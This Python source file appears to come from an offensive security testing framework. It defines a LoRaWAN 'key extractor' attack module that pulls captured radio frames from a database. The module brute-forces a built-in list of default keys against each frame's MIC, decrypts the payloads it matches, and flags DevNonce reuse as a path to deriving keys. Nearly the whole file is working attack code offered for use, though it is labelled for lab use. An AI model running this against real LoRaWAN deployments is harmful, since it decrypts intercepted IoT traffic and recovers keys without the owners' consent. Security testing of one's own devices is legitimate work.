"""LoRaWAN key extraction and cryptographic analysis engine.

Decrypt FRMPayload with known keys using AES-CTR, verify MIC using
AES-CMAC, track DevNonce reuse, and brute-force common default keys.

Requires pycryptodome or the cryptography library for real AES operations.
If neither is available, crypto operations are skipped and the module
reports degraded status.
"""

from __future__ import annotations

import struct
import time
from typing import Any

import structlog

from srt.core import db
from srt.core.module import AttackModule, AttackResult, ModuleContext, Risk, Status
from srt.core.registry import register
from srt.recon.lora.frame_parser import LoRaWANParser

log = structlog.get_logger(__name__)

# Attempt to import a real AES library.
# Prefer pycryptodome (Crypto.Cipher.AES), fall back to cryptography lib.
_AES_AVAILABLE = False
_AES_BACKEND = "none"

try:
    from Crypto.Cipher import AES as _PyCryptoAES  # noqa: N811
    _AES_AVAILABLE = True
    _AES_BACKEND = "pycryptodome"
except ImportError:
    try:
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        _AES_AVAILABLE = True
        _AES_BACKEND = "cryptography"
    except ImportError:
        # Neither library available - crypto operations will be skipped.
        log.warning(
            "lora.key_extractor.no_aes_library",
            detail="Neither pycryptodome nor cryptography library is installed. "
                   "AES crypto operations (MIC verification, payload decryption) "
                   "will be unavailable. Install pycryptodome: pip install pycryptodome",
        )

# Common default/weak LoRaWAN keys
DEFAULT_KEYS: list[dict[str, str]] = [
    {"name": "all_zeros", "key": "00000000000000000000000000000000"},
    {"name": "all_ones", "key": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"},
    {"name": "sequential", "key": "0102030405060708090A0B0C0D0E0F10"},
    {"name": "test_key_1", "key": "2B7E151628AED2A6ABF7158809CF4F3C"},
    {"name": "ttn_default", "key": "00000000000000000000000000000001"},
    {"name": "loriot_default", "key": "01020304050607080102030405060708"},
]


def _aes_encrypt_block(key: bytes, block: bytes) -> bytes:
    """AES-128 ECB encrypt a single 16-byte block.

    Uses pycryptodome or cryptography if available. Raises RuntimeError
    if no AES library is installed (caller must check _AES_AVAILABLE).
    """
    if not _AES_AVAILABLE:
        raise RuntimeError("No AES library available for block encryption")

    if _AES_BACKEND == "pycryptodome":
        cipher = _PyCryptoAES.new(key, _PyCryptoAES.MODE_ECB)
        return cipher.encrypt(block)
    else:
        # cryptography backend
        cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(block) + encryptor.finalize()


def _aes_cmac(key: bytes, message: bytes) -> bytes:
    """Compute AES-CMAC (RFC 4493) for MIC verification.

    Uses the available AES library. Raises RuntimeError if no AES
    library is installed (caller must check _AES_AVAILABLE).
    """
    if not _AES_AVAILABLE:
        raise RuntimeError("No AES library available for CMAC computation")

    if _AES_BACKEND == "pycryptodome":
        from Crypto.Cipher import AES as _AES
        from Crypto.Hash import CMAC as _CMAC
        mac = _CMAC.new(key, ciphermod=_AES)
        mac.update(message)
        return mac.digest()[:4]
    else:
        # cryptography backend
        from cryptography.hazmat.primitives.cmac import CMAC as _CrypCMAC  # noqa: N811
        c = _CrypCMAC(algorithms.AES(key), backend=default_backend())
        c.update(message)
        return c.finalize()[:4]


def _compute_mic(key: bytes, direction: int, devaddr: int,
                 fcnt: int, payload: bytes) -> bytes:
    """Compute LoRaWAN MIC using AES-CMAC over B0 block + message."""
    b0 = struct.pack(
        "<BIBIHBB",
        0x49,
        0x00000000,
        direction,
        devaddr,
        fcnt,
        0x00,
        len(payload),
    )
    msg = b0 + payload
    return _aes_cmac(key, msg)


def _decrypt_frm_payload(key: bytes, direction: int, devaddr: int,
                         fcnt: int, frm_payload: bytes) -> bytes:
    """Decrypt FRMPayload using AES-CTR (LoRaWAN encryption scheme).

    LoRaWAN uses AES in CTR mode with block:
    Ai = 0x01 | 0x0000 | Dir | DevAddr | FCnt | 0x00 | i
    """
    decrypted = bytearray()
    num_blocks = (len(frm_payload) + 15) // 16

    for i in range(1, num_blocks + 1):
        a_block = struct.pack(
            "<BIBIHBB",
            0x01,
            0x00000000,
            direction,
            devaddr,
            fcnt,
            0x00,
            i,
        )
        s_block = _aes_encrypt_block(key, a_block)
        start = (i - 1) * 16
        end = min(i * 16, len(frm_payload))
        for j in range(start, end):
            decrypted.append(frm_payload[j] ^ s_block[j - start])

    return bytes(decrypted)


@register
class LoraKeyExtractor(AttackModule):
    """LoRaWAN key extraction and cryptographic analysis.

    Decrypts FRMPayload with known keys using AES-CTR, verifies MIC
    using AES-CMAC, tracks DevNonce reuse for key recovery, and
    brute-forces common default key lists.
    """

    name = "lora.key_extractor"
    protocol = "lora"
    risk = Risk.ACTIVE_LAB
    mitre_ttp = ["T1110", "T1557"]
    requires = []
    description = (
        "LoRaWAN crypto analysis: decrypt with known keys, MIC verification, "
        "DevNonce reuse detection, default key brute-force."
    )

    def __init__(self) -> None:
        self._parser = LoRaWANParser()

    def precheck(self, ctx: ModuleContext) -> bool:
        if not super().precheck(ctx):
            return False
        return True

    def _try_decrypt_frame(
        self, raw_hex: str, keys: list[dict[str, str]]
    ) -> dict[str, Any] | None:
        """Attempt to decrypt a frame with candidate keys."""
        try:
            raw_bytes = bytes.fromhex(raw_hex)
        except (ValueError, TypeError):
            return None

        parsed = self._parser.parse(raw_bytes)
        if "error" in parsed or parsed.get("mtype") not in (2, 3, 4, 5):
            return None

        devaddr_str = parsed.get("dev_addr", "")
        if not devaddr_str:
            return None

        try:
            devaddr = int(devaddr_str, 16)
        except (ValueError, TypeError):
            return None

        fcnt = parsed.get("fcnt", 0)
        direction = parsed.get("direction", 0)
        frm_hex = parsed.get("frm_payload_hex", "")
        mic_hex = parsed.get("mic", "")

        if not frm_hex:
            return None

        frm_payload = bytes.fromhex(frm_hex)
        mic_bytes = bytes.fromhex(mic_hex) if mic_hex else b""

        # Try each key
        for key_entry in keys:
            try:
                key = bytes.fromhex(key_entry["key"])
            except (ValueError, TypeError):
                continue

            # Verify MIC
            msg = raw_bytes[:-4]  # Everything except MIC
            computed_mic = _compute_mic(key, direction, devaddr, fcnt, msg)

            if computed_mic == mic_bytes:
                # MIC matches - decrypt payload
                decrypted = _decrypt_frm_payload(key, direction, devaddr, fcnt, frm_payload)
                return {
                    "dev_addr": devaddr_str,
                    "fcnt": fcnt,
                    "key_name": key_entry["name"],
                    "key_hex": key_entry["key"],
                    "mic_verified": True,
                    "decrypted_hex": decrypted.hex(),
                    "decrypted_ascii": decrypted.decode("ascii", errors="replace"),
                }

        return None

    def _track_dev_nonces(
        self, frames: list[dict[str, Any]]
    ) -> dict[str, Any]:
        """Track DevNonce values for reuse detection."""
        nonce_tracker: dict[str, list[int]] = {}  # DevEUI -> list of nonces
        reuses: list[dict[str, Any]] = []

        for frame in frames:
            if frame.get("mtype") != 0:  # Join Request only
                continue
            dev_eui = frame.get("dev_eui", "")
            dev_nonce = frame.get("dev_nonce")
            if not dev_eui or dev_nonce is None:
                continue

            nonce_tracker.setdefault(dev_eui, [])
            if dev_nonce in nonce_tracker[dev_eui]:
                reuses.append({
                    "dev_eui": dev_eui,
                    "dev_nonce": dev_nonce,
                    "occurrence_count": nonce_tracker[dev_eui].count(dev_nonce) + 1,
                    "vulnerability": "DevNonce reuse enables key derivation attack",
                })
            nonce_tracker[dev_eui].append(dev_nonce)

        return {
            "devices_tracked": len(nonce_tracker),
            "total_join_requests": sum(len(v) for v in nonce_tracker.values()),
            "nonce_reuses": reuses,
        }

    def run(self, ctx: ModuleContext) -> AttackResult:
        started = time.time()

        if ctx.dry_run:
            return self._result(
                Status.OK,
                started,
                summary="[DRY-RUN] lora.key_extractor would attempt key extraction",
            )

        # If no AES library is available, skip crypto operations entirely
        # and report clearly that the module is degraded.
        if not _AES_AVAILABLE:
            log.warning(
                "lora.key_extractor.crypto_unavailable",
                detail="AES library unavailable, crypto operations skipped",
            )
            # Still perform nonce tracking (does not require AES)
            all_parsed: list[dict[str, Any]] = []
            try:
                with db.connect() as conn, conn.cursor() as cur:
                    cur.execute(
                        """
                        SELECT fields
                        FROM headers
                        WHERE session_id = %s AND protocol = 'lora'
                        ORDER BY ts
                        """,
                        (str(ctx.session_id),),
                    )
                    for row in cur.fetchall():
                        fields = row[0]
                        if isinstance(fields, str):
                            import json
                            try:
                                fields = json.loads(fields)
                            except (ValueError, TypeError):
                                fields = {}
                        if not isinstance(fields, dict):
                            fields = {}
                        raw_hex = fields.get("raw_payload", fields.get("phy_payload", ""))
                        if not raw_hex:
                            continue
                        try:
                            parsed = self._parser.parse(bytes.fromhex(raw_hex))
                            all_parsed.append(parsed)
                        except (ValueError, TypeError):
                            continue
            except Exception as exc:
                log.warning("lora.key_extractor.db_error", error=str(exc))
                return self._result(
                    Status.FAIL, started, summary=f"DB query error: {exc}"
                )

            nonce_analysis = self._track_dev_nonces(all_parsed)
            summary = (
                "AES library unavailable, crypto operations skipped. "
                f"Nonce tracking only: "
                f"{len(nonce_analysis.get('nonce_reuses', []))} nonce reuses, "
                f"{nonce_analysis.get('total_join_requests', 0)} join requests analyzed"
            )
            return self._result(
                Status.OK,
                started,
                summary=summary,
                artifacts=[
                    {"type": "nonce_analysis", "data": nonce_analysis},
                ],
                metrics={
                    "aes_available": False,
                    "crypto_degraded": True,
                    "frames_decrypted": 0,
                    "keys_tried": 0,
                    "nonce_reuses": len(nonce_analysis.get("nonce_reuses", [])),
                    "join_requests": nonce_analysis.get("total_join_requests", 0),
                },
            )

        # Gather user-supplied keys + defaults
        user_keys = ctx.params.get("keys", [])
        candidate_keys = list(DEFAULT_KEYS)
        for k in user_keys:
            if isinstance(k, dict) and "key" in k:
                candidate_keys.append(k)
            elif isinstance(k, str):
                candidate_keys.append({"name": "user_key", "key": k})

        decrypted_frames: list[dict[str, Any]] = []
        all_parsed_full: list[dict[str, Any]] = []

        try:
            with db.connect() as conn, conn.cursor() as cur:
                cur.execute(
                    """
                    SELECT fields
                    FROM headers
                    WHERE session_id = %s AND protocol = 'lora'
                    ORDER BY ts
                    """,
                    (str(ctx.session_id),),
                )
                for row in cur.fetchall():
                    fields = row[0]
                    if isinstance(fields, str):
                        import json
                        try:
                            fields = json.loads(fields)
                        except (ValueError, TypeError):
                            fields = {}
                    if not isinstance(fields, dict):
                        fields = {}

                    raw_hex = fields.get("raw_payload", fields.get("phy_payload", ""))
                    if not raw_hex:
                        continue

                    # Parse for nonce tracking
                    try:
                        parsed = self._parser.parse(bytes.fromhex(raw_hex))
                        all_parsed_full.append(parsed)
                    except (ValueError, TypeError):
                        continue

                    # Try to decrypt
                    result = self._try_decrypt_frame(raw_hex, candidate_keys)
                    if result:
                        decrypted_frames.append(result)

        except Exception as exc:
            log.warning("lora.key_extractor.db_error", error=str(exc))
            return self._result(
                Status.FAIL, started, summary=f"DB query error: {exc}"
            )

        nonce_analysis = self._track_dev_nonces(all_parsed_full)

        summary = (
            f"Key extraction: {len(decrypted_frames)} frames decrypted, "
            f"{len(nonce_analysis.get('nonce_reuses', []))} nonce reuses, "
            f"{nonce_analysis.get('total_join_requests', 0)} join requests analyzed"
        )

        return self._result(
            Status.OK,
            started,
            summary=summary,
            artifacts=[
                {"type": "decrypted_frames", "data": decrypted_frames},
                {"type": "nonce_analysis", "data": nonce_analysis},
            ],
            metrics={
                "aes_available": True,
                "crypto_degraded": False,
                "frames_decrypted": len(decrypted_frames),
                "keys_tried": len(candidate_keys),
                "nonce_reuses": len(nonce_analysis.get("nonce_reuses", [])),
                "join_requests": nonce_analysis.get("total_join_requests", 0),
            },
        )

    def cleanup(self, ctx: ModuleContext) -> None:
        pass
